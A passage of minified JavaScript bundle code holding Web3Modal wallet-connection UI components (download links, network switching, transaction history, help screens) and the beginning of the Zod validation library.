    `:null}async onSelectPlatform(e){var r;const n=(r=this.shadowRoot)==null?void 0:r.querySelector("div");n&&(await n.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.platform=e,n.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}};Kd([ee()],zs.prototype,"platform",void 0);Kd([ee()],zs.prototype,"platforms",void 0);zs=Kd([z("w3m-connecting-wc-view")],zs);var W5=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let f0=class extends H{constructor(){var e;super(...arguments),this.wallet=(e=ie.state.data)==null?void 0:e.wallet}render(){if(!this.wallet)throw new Error("w3m-downloads-view");return $`
      <wui-flex gap="xs" flexDirection="column" .padding=${["s","s","l","s"]}>
        ${this.chromeTemplate()} ${this.iosTemplate()} ${this.androidTemplate()}
        ${this.homepageTemplate()}
      </wui-flex>
    `}chromeTemplate(){var e;return(e=this.wallet)!=null&&e.chrome_store?$`<wui-list-item
      variant="icon"
      icon="chromeStore"
      iconVariant="square"
      @click=${this.onChromeStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Chrome Extension</wui-text>
    </wui-list-item>`:null}iosTemplate(){var e;return(e=this.wallet)!=null&&e.app_store?$`<wui-list-item
      variant="icon"
      icon="appStore"
      iconVariant="square"
      @click=${this.onAppStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">iOS App</wui-text>
    </wui-list-item>`:null}androidTemplate(){var e;return(e=this.wallet)!=null&&e.play_store?$`<wui-list-item
      variant="icon"
      icon="playStore"
      iconVariant="square"
      @click=${this.onPlayStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Android App</wui-text>
    </wui-list-item>`:null}homepageTemplate(){var e;return(e=this.wallet)!=null&&e.homepage?$`
      <wui-list-item
        variant="icon"
        icon="browser"
        iconVariant="square-blue"
        @click=${this.onHomePage.bind(this)}
        chevron
      >
        <wui-text variant="paragraph-500" color="fg-100">Website</wui-text>
      </wui-list-item>
    `:null}onChromeStore(){var e;(e=this.wallet)!=null&&e.chrome_store&&le.openHref(this.wallet.chrome_store,"_blank")}onAppStore(){var e;(e=this.wallet)!=null&&e.app_store&&le.openHref(this.wallet.app_store,"_blank")}onPlayStore(){var e;(e=this.wallet)!=null&&e.play_store&&le.openHref(this.wallet.play_store,"_blank")}onHomePage(){var e;(e=this.wallet)!=null&&e.homepage&&le.openHref(this.wallet.homepage,"_blank")}};f0=W5([z("w3m-downloads-view")],f0);var z5=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const H5="https://walletconnect.com/explorer";let h0=class extends H{render(){return $`
      <wui-flex flexDirection="column" padding="s" gap="xs">
        ${this.recommendedWalletsTemplate()}
        <wui-list-wallet
          name="Explore all"
          showAllWallets
          walletIcon="allWallets"
          icon="externalLink"
          @click=${()=>{le.openHref("https://walletconnect.com/explorer?type=wallet","_blank")}}
        ></wui-list-wallet>
      </wui-flex>
    `}recommendedWalletsTemplate(){const{recommended:e,featured:n}=Pe.state,{customWallets:r}=Ue.state;return[...n,...r??[],...e].slice(0,4).map(i=>$`
        <wui-list-wallet
          name=${i.name??"Unknown"}
          tagVariant="main"
          imageSrc=${ve(Xe.getWalletImage(i))}
          @click=${()=>{le.openHref(i.homepage??H5,"_blank")}}
        ></wui-list-wallet>
      `)}};h0=z5([z("w3m-get-wallet-view")],h0);const V5=q`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-hexagon {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: 4px;
    bottom: 0;
    opacity: 0;
    transform: scale(0.5);
    z-index: 1;
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  wui-button {
    display: none;
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  wui-button[data-retry='true'] {
    display: block;
    opacity: 1;
  }
`;var Yd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let pa=class extends H{constructor(){var e;super(),this.network=(e=ie.state.data)==null?void 0:e.network,this.unsubscribe=[],this.showRetry=!1,this.error=!1}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}firstUpdated(){this.onSwitchNetwork()}render(){if(!this.network)throw new Error("w3m-network-switch-view: No network provided");this.onShowRetry();const e=this.error?"Switch declined":"Approve in wallet",n=this.error?"Switch can be declined if chain is not supported by a wallet or previous request is still active":"Accept connection request in your wallet";return $`
      <wui-flex
        data-error=${this.error}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","3xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-network-image
            size="lg"
            imageSrc=${ve(Xe.getNetworkImage(this.network))}
          ></wui-network-image>

          ${this.error?null:$`<wui-loading-hexagon></wui-loading-hexagon>`}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            ?border=${!0}
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text align="center" variant="paragraph-500" color="fg-100">${e}</wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${n}</wui-text>
        </wui-flex>

        <wui-button
          data-retry=${this.showRetry}
          variant="fill"
          .disabled=${!this.error}
          @click=${this.onSwitchNetwork.bind(this)}
        >
          <wui-icon color="inherit" slot="iconLeft" name="refresh"></wui-icon>
          Try again
        </wui-button>
      </wui-flex>
    `}onShowRetry(){var e;this.error&&!this.showRetry&&(this.showRetry=!0,((e=this.shadowRoot)==null?void 0:e.querySelector("wui-button")).animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}async onSwitchNetwork(){try{this.error=!1,this.network&&(await Qe.switchActiveNetwork(this.network),nt.state.isSiweEnabled||wp.navigateAfterNetworkSwitch())}catch{this.error=!0}}};pa.styles=V5;Yd([ee()],pa.prototype,"showRetry",void 0);Yd([ee()],pa.prototype,"error",void 0);pa=Yd([z("w3m-network-switch-view")],pa);const Z5=q`
  :host > wui-grid {
    max-height: 360px;
    overflow: auto;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }
`;var f1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Hs=class extends H{constructor(){super(),this.unsubscribe=[],this.caipNetwork=Qe.state.caipNetwork,this.unsubscribe.push(Qe.subscribeKey("caipNetwork",e=>this.caipNetwork=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return $`
      <wui-grid padding="s" gridTemplateColumns="repeat(4, 1fr)" rowGap="l" columnGap="xs">
        ${this.networksTemplate()}
      </wui-grid>

      <wui-separator></wui-separator>

      <wui-flex padding="s" flexDirection="column" gap="m" alignItems="center">
        <wui-text variant="small-400" color="fg-300" align="center">
          Your connected wallet may not support some of the networks available for this dApp
        </wui-text>
        <wui-link @click=${this.onNetworkHelp.bind(this)}>
          <wui-icon size="xs" color="accent-100" slot="iconLeft" name="helpCircle"></wui-icon>
          What is a network
        </wui-link>
      </wui-flex>
    `}onNetworkHelp(){we.sendEvent({type:"track",event:"CLICK_NETWORK_HELP"}),ie.push("WhatIsANetwork")}networksTemplate(){const{approvedCaipNetworkIds:e,requestedCaipNetworks:n,supportsAllNetworks:r}=Qe.state,o=e,i=n,a={};return i&&o&&(o.forEach((s,c)=>{a[s]=c}),i.sort((s,c)=>{const l=a[s.id],u=a[c.id];return l!==void 0&&u!==void 0?l-u:l!==void 0?-1:u!==void 0?1:0})),i==null?void 0:i.map(s=>{var c;return $`
        <wui-card-select
          .selected=${((c=this.caipNetwork)==null?void 0:c.id)===s.id}
          imageSrc=${ve(Xe.getNetworkImage(s))}
          type="network"
          name=${s.name??s.id}
          @click=${()=>this.onSwitchNetwork(s)}
          .disabled=${!r&&!(o!=null&&o.includes(s.id))}
          data-testid=${`w3m-network-switch-${s.name??s.id}`}
        ></wui-card-select>
      `})}async onSwitchNetwork(e){const{isConnected:n}=ke.state,{approvedCaipNetworkIds:r,supportsAllNetworks:o,caipNetwork:i}=Qe.state,{data:a}=ie.state;n&&(i==null?void 0:i.id)!==e.id?r!=null&&r.includes(e.id)?(await Qe.switchActiveNetwork(e),wp.navigateAfterNetworkSwitch()):o&&ie.push("SwitchNetwork",{...a,network:e}):n||(Qe.setCaipNetwork(e),ie.push("Connect"))}};Hs.styles=Z5;f1([ee()],Hs.prototype,"caipNetwork",void 0);Hs=f1([z("w3m-networks-view")],Hs);const G5=q`
  :host > wui-flex:first-child {
    height: 500px;
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: none;
  }
`;var gi=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const us="last-transaction",q5=7;let Hn=class extends H{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.address=ke.state.address,this.transactions=Xt.state.transactions,this.transactionsByYear=Xt.state.transactionsByYear,this.loading=Xt.state.loading,this.empty=Xt.state.empty,this.next=Xt.state.next,this.unsubscribe.push(ke.subscribe(e=>{e.isConnected&&this.address!==e.address&&(this.address=e.address,Xt.resetTransactions(),Xt.fetchTransactions(e.address))}),Xt.subscribe(e=>{this.transactions=e.transactions,this.transactionsByYear=e.transactionsByYear,this.loading=e.loading,this.empty=e.empty,this.next=e.next}))}firstUpdated(){this.transactions.length===0&&Xt.fetchTransactions(this.address),this.createPaginationObserver()}updated(){this.setPaginationObserver()}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return $`
      <wui-flex flexDirection="column" padding="s" gap="s">
        ${this.empty?null:this.templateTransactionsByYear()}
        ${this.loading?this.templateLoading():null}
        ${!this.loading&&this.empty?this.templateEmpty():null}
      </wui-flex>
    `}templateTransactionsByYear(){const e=Object.keys(this.transactionsByYear).sort().reverse();return e.map((n,r)=>{const o=r===e.length-1,i=parseInt(n,10),a=Br.getTransactionGroupTitle(i),s=this.transactionsByYear[i];return s?$`
        <wui-flex flexDirection="column" gap="s">
          <wui-flex
            alignItems="center"
            flexDirection="row"
            .padding=${["xs","s","s","s"]}
          >
            <wui-text variant="paragraph-500" color="fg-200">${a}</wui-text>
          </wui-flex>
          <wui-flex flexDirection="column" gap="xs">
            ${this.templateTransactions(s,o)}
          </wui-flex>
        </wui-flex>
      `:null})}templateRenderTransaction(e,n){const{date:r,descriptions:o,direction:i,isAllNFT:a,images:s,status:c,transfers:l,type:u}=this.getTransactionListItemProps(e),p=(l==null?void 0:l.length)>1;return(l==null?void 0:l.length)===2&&!a?$`
        <wui-transaction-list-item
          date=${r}
          .direction=${i}
          id=${n&&this.next?us:""}
          status=${c}
          type=${u}
          .images=${s}
          .descriptions=${o}
        ></wui-transaction-list-item>
      `:p?l.map((g,w)=>{const v=Br.getTransferDescription(g),E=n&&w===l.length-1;return $` <wui-transaction-list-item
          date=${r}
          direction=${g.direction}
          id=${E&&this.next?us:""}
          status=${c}
          type=${u}
          .onlyDirectionIcon=${!0}
          .images=${[s==null?void 0:s[w]]}
          .descriptions=${[v]}
        ></wui-transaction-list-item>`}):$`
      <wui-transaction-list-item
        date=${r}
        .direction=${i}
        id=${n&&this.next?us:""}
        status=${c}
        type=${u}
        .images=${s}
        .descriptions=${o}
      ></wui-transaction-list-item>
    `}templateTransactions(e,n){return e.map((r,o)=>{const i=n&&o===e.length-1;return $`${this.templateRenderTransaction(r,i)}`})}templateEmpty(){return $`
      <wui-flex
        flexGrow="1"
        flexDirection="column"
        justifyContent="center"
        alignItems="center"
        .padding=${["3xl","xl","3xl","xl"]}
        gap="xl"
      >
        <wui-icon-box
          backgroundColor="glass-005"
          background="gray"
          iconColor="fg-200"
          icon="wallet"
          size="lg"
          ?border=${!0}
          borderColor="wui-color-bg-125"
        ></wui-icon-box>
        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text align="center" variant="paragraph-500" color="fg-100"
            >No Transactions yet</wui-text
          >
          <wui-text align="center" variant="small-500" color="fg-200"
            >Start trading on dApps <br />
            to grow your wallet!</wui-text
          >
        </wui-flex>
      </wui-flex>
    `}templateLoading(){return Array(q5).fill($` <wui-transaction-list-item-loader></wui-transaction-list-item-loader> `).map(e=>e)}createPaginationObserver(){const{projectId:e}=Ue.state;this.paginationObserver=new IntersectionObserver(([n])=>{n!=null&&n.isIntersecting&&!this.loading&&(Xt.fetchTransactions(this.address),we.sendEvent({type:"track",event:"LOAD_MORE_TRANSACTIONS",properties:{address:this.address,projectId:e,cursor:this.next}}))},{}),this.setPaginationObserver()}setPaginationObserver(){var n,r,o;(n=this.paginationObserver)==null||n.disconnect();const e=(r=this.shadowRoot)==null?void 0:r.querySelector(`#${us}`);e&&((o=this.paginationObserver)==null||o.observe(e))}getTransactionListItemProps(e){var c,l,u,p,m;const n=s1.getRelativeDateFromNow((c=e==null?void 0:e.metadata)==null?void 0:c.minedAt),r=Br.getTransactionDescriptions(e),o=e==null?void 0:e.transfers,i=(l=e==null?void 0:e.transfers)==null?void 0:l[0],a=!!i&&((u=e==null?void 0:e.transfers)==null?void 0:u.every(g=>!!g.nft_info)),s=Br.getTransactionImages(o);return{date:n,direction:i==null?void 0:i.direction,descriptions:r,isAllNFT:a,images:s,status:(p=e.metadata)==null?void 0:p.status,transfers:o,type:(m=e.metadata)==null?void 0:m.operationType}}};Hn.styles=G5;gi([ee()],Hn.prototype,"address",void 0);gi([ee()],Hn.prototype,"transactions",void 0);gi([ee()],Hn.prototype,"transactionsByYear",void 0);gi([ee()],Hn.prototype,"loading",void 0);gi([ee()],Hn.prototype,"empty",void 0);gi([ee()],Hn.prototype,"next",void 0);Hn=gi([z("w3m-transactions-view")],Hn);var K5=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const Y5=[{images:["network","layers","system"],title:"The system’s nuts and bolts",text:"A network is what brings the blockchain to life, as this technical infrastructure allows apps to access the ledger and smart contract services."},{images:["noun","defiAlt","dao"],title:"Designed for different uses",text:"Each network is designed differently, and may therefore suit certain apps and experiences."}];let p0=class extends H{render(){return $`
      <wui-flex
        flexDirection="column"
        .padding=${["xxl","xl","xl","xl"]}
        alignItems="center"
        gap="xl"
      >
        <w3m-help-widget .data=${Y5}></w3m-help-widget>
        <wui-button
          variant="fill"
          size="sm"
          @click=${()=>{le.openHref("https://ethereum.org/en/developers/docs/networks/","_blank")}}
        >
          Learn more
          <wui-icon color="inherit" slot="iconRight" name="externalLink"></wui-icon>
        </wui-button>
      </wui-flex>
    `}};p0=K5([z("w3m-what-is-a-network-view")],p0);var J5=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const X5=[{images:["login","profile","lock"],title:"One login for all of web3",text:"Log in to any app by connecting your wallet. Say goodbye to countless passwords!"},{images:["defi","nft","eth"],title:"A home for your digital assets",text:"A wallet lets you store, send and receive digital assets like cryptocurrencies and NFTs."},{images:["browser","noun","dao"],title:"Your gateway to a new web",text:"With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more."}];let m0=class extends H{render(){return $`
      <wui-flex
        flexDirection="column"
        .padding=${["xxl","xl","xl","xl"]}
        alignItems="center"
        gap="xl"
      >
        <w3m-help-widget .data=${X5}></w3m-help-widget>
        <wui-button variant="fill" size="sm" @click=${this.onGetWallet.bind(this)}>
          <wui-icon color="inherit" slot="iconLeft" name="wallet"></wui-icon>
          Get a wallet
        </wui-button>
      </wui-flex>
    `}onGetWallet(){we.sendEvent({type:"track",event:"CLICK_GET_WALLET"}),ie.push("GetWallet")}};m0=J5([z("w3m-what-is-a-wallet-view")],m0);const Q5=q`
  wui-loading-spinner {
    margin: 9px auto;
  }
`,ae={SECURE_SITE_SDK:"https://secure.web3modal.com/sdk",APP_EVENT_KEY:"@w3m-app/",FRAME_EVENT_KEY:"@w3m-frame/",RPC_METHOD_KEY:"RPC_",STORAGE_KEY:"@w3m-storage/",SESSION_TOKEN_KEY:"SESSION_TOKEN_KEY",EMAIL_LOGIN_USED_KEY:"EMAIL_LOGIN_USED_KEY",LAST_USED_CHAIN_KEY:"LAST_USED_CHAIN_KEY",LAST_EMAIL_LOGIN_TIME:"LAST_EMAIL_LOGIN_TIME",EMAIL:"EMAIL",APP_SWITCH_NETWORK:"@w3m-app/SWITCH_NETWORK",APP_CONNECT_EMAIL:"@w3m-app/CONNECT_EMAIL",APP_CONNECT_DEVICE:"@w3m-app/CONNECT_DEVICE",APP_CONNECT_OTP:"@w3m-app/CONNECT_OTP",APP_GET_USER:"@w3m-app/GET_USER",APP_SIGN_OUT:"@w3m-app/SIGN_OUT",APP_IS_CONNECTED:"@w3m-app/IS_CONNECTED",APP_GET_CHAIN_ID:"@w3m-app/GET_CHAIN_ID",APP_RPC_REQUEST:"@w3m-app/RPC_REQUEST",APP_UPDATE_EMAIL:"@w3m-app/UPDATE_EMAIL",APP_AWAIT_UPDATE_EMAIL:"@w3m-app/AWAIT_UPDATE_EMAIL",APP_SYNC_THEME:"@w3m-app/SYNC_THEME",FRAME_SWITCH_NETWORK_ERROR:"@w3m-frame/SWITCH_NETWORK_ERROR",FRAME_SWITCH_NETWORK_SUCCESS:"@w3m-frame/SWITCH_NETWORK_SUCCESS",FRAME_CONNECT_EMAIL_ERROR:"@w3m-frame/CONNECT_EMAIL_ERROR",FRAME_CONNECT_EMAIL_SUCCESS:"@w3m-frame/CONNECT_EMAIL_SUCCESS",FRAME_CONNECT_DEVICE_ERROR:"@w3m-frame/CONNECT_DEVICE_ERROR",FRAME_CONNECT_DEVICE_SUCCESS:"@w3m-frame/CONNECT_DEVICE_SUCCESS",FRAME_CONNECT_OTP_SUCCESS:"@w3m-frame/CONNECT_OTP_SUCCESS",FRAME_CONNECT_OTP_ERROR:"@w3m-frame/CONNECT_OTP_ERROR",FRAME_GET_USER_SUCCESS:"@w3m-frame/GET_USER_SUCCESS",FRAME_GET_USER_ERROR:"@w3m-frame/GET_USER_ERROR",FRAME_SIGN_OUT_SUCCESS:"@w3m-frame/SIGN_OUT_SUCCESS",FRAME_SIGN_OUT_ERROR:"@w3m-frame/SIGN_OUT_ERROR",FRAME_IS_CONNECTED_SUCCESS:"@w3m-frame/IS_CONNECTED_SUCCESS",FRAME_IS_CONNECTED_ERROR:"@w3m-frame/IS_CONNECTED_ERROR",FRAME_GET_CHAIN_ID_SUCCESS:"@w3m-frame/GET_CHAIN_ID_SUCCESS",FRAME_GET_CHAIN_ID_ERROR:"@w3m-frame/GET_CHAIN_ID_ERROR",FRAME_RPC_REQUEST_SUCCESS:"@w3m-frame/RPC_REQUEST_SUCCESS",FRAME_RPC_REQUEST_ERROR:"@w3m-frame/RPC_REQUEST_ERROR",FRAME_SESSION_UPDATE:"@w3m-frame/SESSION_UPDATE",FRAME_UPDATE_EMAIL_SUCCESS:"@w3m-frame/UPDATE_EMAIL_SUCCESS",FRAME_UPDATE_EMAIL_ERROR:"@w3m-frame/UPDATE_EMAIL_ERROR",FRAME_AWAIT_UPDATE_EMAIL_SUCCESS:"@w3m-frame/AWAIT_UPDATE_EMAIL_SUCCESS",FRAME_AWAIT_UPDATE_EMAIL_ERROR:"@w3m-frame/AWAIT_UPDATE_EMAIL_ERROR",FRAME_SYNC_THEME_SUCCESS:"@w3m-frame/SYNC_THEME_SUCCESS",FRAME_SYNC_THEME_ERROR:"@w3m-frame/SYNC_THEME_ERROR"};var Me;(function(t){t.assertEqual=o=>o;function e(o){}t.assertIs=e;function n(o){throw new Error}t.assertNever=n,t.arrayToEnum=o=>{const i={};for(const a of o)i[a]=a;return i},t.getValidEnumValues=o=>{const i=t.objectKeys(o).filter(s=>typeof o[o[s]]!="number"),a={};for(const s of i)a[s]=o[s];return t.objectValues(a)},t.objectValues=o=>t.objectKeys(o).map(function(i){return o[i]}),t.objectKeys=typeof Object.keys=="function"?o=>Object.keys(o):o=>{const i=[];for(const a in o)Object.prototype.hasOwnProperty.call(o,a)&&i.push(a);return i},t.find=(o,i)=>{for(const a of o)if(i(a))return a},t.isInteger=typeof Number.isInteger=="function"?o=>Number.isInteger(o):o=>typeof o=="number"&&isFinite(o)&&Math.floor(o)===o;function r(o,i=" | "){return o.map(a=>typeof a=="string"?`'${a}'`:a).join(i)}t.joinValues=r,t.jsonStringifyReplacer=(o,i)=>typeof i=="bigint"?i.toString():i})(Me||(Me={}));var _u;(function(t){t.mergeShapes=(e,n)=>({...e,...n})})(_u||(_u={}));const J=Me.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),nr=t=>{switch(typeof t){case"undefined":return J.undefined;case"string":return J.string;case"number":return isNaN(t)?J.nan:J.number;case"boolean":return J.boolean;case"function":return J.function;case"bigint":return J.bigint;case"symbol":return J.symbol;case"object":return Array.isArray(t)?J.array:t===null?J.null:t.then&&typeof t.then=="function"&&t.catch&&typeof t.catch=="function"?J.promise:typeof Map<"u"&&t instanceof Map?J.map:typeof Set<"u"&&t instanceof Set?J.set:typeof Date<"u"&&t instanceof Date?J.date:J.object;default:return J.unknown}},V=Me.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]),e6=t=>JSON.stringify(t,null,2).replace(/"([^"]+)":/g,"$1:");class nn extends Error{constructor(e){super(),this.issues=[],this.addIssue=r=>{this.issues=[...this.issues,r]},this.addIssues=(r=[])=>{this.issues=[...this.issues,...r]};const n=new.target.prototype;Object.setPrototypeOf?Object.setPrototypeOf(this,n):this.__proto__=n,this.name="ZodError",this.issues=e}get errors(){return this.issues}format(e){const n=e||function(i){return i.message},r={_errors:[]},o=i=>{for(const a of i.issues)if(a.code==="invalid_union")a.unionErrors.map(o);else if(a.code==="invalid_return_type")o(a.returnTypeError);else if(a.code==="invalid_arguments")o(a.argumentsError);else if(a.path.length===0)r._errors.push(n(a));else{let s=r,c=0;for(;c<a.path.length;){const l=a.path[c];c===a.path.length-1?(s[l]=s[l]||{_errors:[]},s[l]._errors.push(n(a))):s[l]=s[l]||{_errors:[]},s=s[l],c++}}};return o(this),r}toString(){return this.message}get message(){return JSON.stringify(this.issues,Me.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(e=n=>n.message){const n={},r=[];for(const o of this.issues)o.path.length>0?(n[o.path[0]]=n[o.path[0]]||[],n[o.path[0]].push(e(o))):r.push(e(o));return{formErrors:r,fieldErrors:n}}get formErrors(){return this.flatten()}}nn.create=t=>new nn(t);const ma=(t,e)=>{let n;switch(t.code){case V.invalid_type:t.received===J.undefined?n="Required":n=`Expected ${t.expected}, received ${t.received}`;break;case V.invalid_literal:n=`Invalid literal value, expected ${JSON.stringify(t.expected,Me.jsonStringifyReplacer)}`;break;case V.unrecognized_keys:n=`Unrecognized key(s) in object: ${Me.joinValues(t.keys,", ")}`;break;case V.invalid_union:n="Invalid input";break;case V.invalid_union_discriminator:n=`Invalid discriminator value. Expected ${Me.joinValues(t.options)}`;break;case V.invalid_enum_value:n=`Invalid enum value. Expected ${Me.joinValues(t.options)}, received '${t.received}'`;break;case V.invalid_arguments:n="Invalid function arguments";break;case V.invalid_return_type:n="Invalid function return type";break;case V.invalid_date:n="Invalid date";break;case V.invalid_string:typeof t.validation=="object"?"includes"in t.validation?(n=`Invalid input: must include "${t.validation.includes}"`,typeof t.validation.position=="number"&&(n=`${n} at one or more positions greater than or equal to ${t.validation.position}`)):"startsWith"in t.validation?n=`Invalid input: must start with "${t.validation.startsWith}"`:"endsWith"in t.validation?n=`Invalid input: must end with "${t.validation.endsWith}"`:Me.assertNever(t.validation):t.validation!=="regex"?n=`Invalid ${t.validation}`:n="Invalid";break;case V.too_small:t.type==="array"?n=`Array must contain ${t.exact?"exactly":t.inclusive?"at least":"more than"} ${t.minimum} element(s)`:t.type==="string"?n=`String must contain ${t.exact?"exactly":t.inclusive?"at least":"over"} ${t.minimum} character(s)`:t.type==="number"?n=`Number must be ${t.exact?"exactly equal to ":t.inclusive?"greater than or equal to ":"greater than "}${t.minimum}`:t.type==="date"?n=`Date must be ${t.exact?"exactly equal to ":t.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(t.minimum))}`:n="Invalid input";break;case V.too_big:t.type==="array"?n=`Array must contain ${t.exact?"exactly":t.inclusive?"at most":"less than"} ${t.maximum} element(s)`:t.type==="string"?n=`String must contain ${t.exact?"exactly":t.inclusive?"at most":"under"} ${t.maximum} character(s)`:t.type==="number"?n=`Number must be ${t.exact?"exactly":t.inclusive?"less than or equal to":"less than"} ${t.maximum}`:t.type==="bigint"?n=`BigInt must be ${t.exact?"exactly":t.inclusive?"less than or equal to":"less than"} ${t.maximum}`:t.type==="date"?n=`Date must be ${t.exact?"exactly":t.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(t.maximum))}`:n="Invalid input";break;case V.custom:n="Invalid input";break;case V.invalid_intersection_types:n="Intersection results could not be merged";break;case V.not_multiple_of:n=`Number must be a multiple of ${t.multipleOf}`;break;case V.not_finite:n="Number must be finite";break;default:n=e.defaultError,Me.assertNever(t)}return{message:n}};let h1=ma;function t6(t){h1=t}function Vs(){return h1}const Zs=t=>{const{data:e,path:n,errorMaps:r,issueData:o}=t,i=[...n,...o.path||[]],a={...o,path:i};let s="";const c=r.filter(l=>!!l).slice().reverse();for(const l of c)s=l(a,{data:e,defaultError:s}).message;return{...o,path:i,message:o.message||s}},n6=[];function te(t,e){const n=Zs({issueData:e,data:t.data,path:t.path,errorMaps:[t.common.contextualErrorMap,t.schemaErrorMap,Vs(),ma].filter(r=>!!r)});t.common.issues.push(n)}class yt{constructor(){this.value="valid"}dirty(){this.value==="valid"&&(this.value="dirty")}abort(){this.value!=="aborted"&&(this.value="aborted")}static mergeArray(e,n){const r=[];for(const o of n){if(o.status==="aborted")return be;o.status==="dirty"&&e.dirty(),r.push(o.value)}return{status:e.value,value:r}}static async mergeObjectAsync(e,n){const r=[];for(const o of n)r.push({key:await o.key,value:await o.value});return yt.mergeObjectSync(e,r)}static mergeObjectSync(e,n){const r={};for(const o of n){const{key:i,value:a}=o;if(i.status==="aborted"||a.status==="aborted")return be;i.status==="dirty"&&e.dirty(),a.status==="dirty"&&e.dirty(),i.value!=="__proto__"&&(typeof a.value<"u"||o.alwaysSet)&&(r[i.value]=a.value)}return{status:e.value,value:r}}}const be=Object.freeze({status:"aborted"}),p1=t=>({status:"dirty",value:t}),St=t=>({status:"valid",value:t}),Eu=t=>t.status==="aborted",Cu=t=>t.status==="dirty",ga=t=>t.status==="valid",Gs=t=>typeof Promise<"u"&&t instanceof Promise;var ue;(function(t){t.errToObj=e=>typeof e=="string"?{message:e}:e||{},t.toString=e=>typeof e=="string"?e:e==null?void 0:e.message})(ue||(ue={}));class $n{constructor(e,n,r,o){this._cachedPath=[],this.parent=e,this.data=n,this._path=r,this._key=o}get path(){return this._cachedPath.length||(this._key instanceof Array?this._cachedPath.push(...this._path,...this._key):this._cachedPath.push(...this._path,this._key)),this._cachedPath}}const g0=(t,e)=>{if(ga(e))return{success:!0,data:e.value};if(!t.common.issues.length)throw new 